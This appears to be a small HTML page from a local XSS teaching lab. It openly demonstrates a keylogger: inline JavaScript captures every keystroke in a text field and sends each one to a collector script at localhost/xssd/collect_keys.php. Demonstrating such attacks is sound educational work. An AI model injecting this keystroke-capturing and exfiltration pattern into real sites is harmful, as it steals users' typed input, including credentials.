<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger XSS Attack</title>
    <link rel="stylesheet" href="refstyle.css">
</head>
<body>
<video autoplay muted loop id="bg-video">
    <source src="vid.mp4" type="video/mp4">
</video>
<div class="container">
    <h1>Keylogging XSS Attack Demonstration</h1>
    <p>Try typing something. Every key you press is logged.</p>
    <input type="text" placeholder="Type something here...">
    
    <script>
        var inputField = document.querySelector("input[type='text']");

        inputField.addEventListener('keyup', function(event) {
            var key = event.key;
            console.log("Captured key:", key); // Debugging step

            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", "http://localhost/xssd/collect_keys.php?key=" + encodeURIComponent(key), true);
            xhttp.send();
        });
    </script>
    <a href="index.php">
    <button type="button">Back to Home</button>
</a>
</div>
</body>
</html>
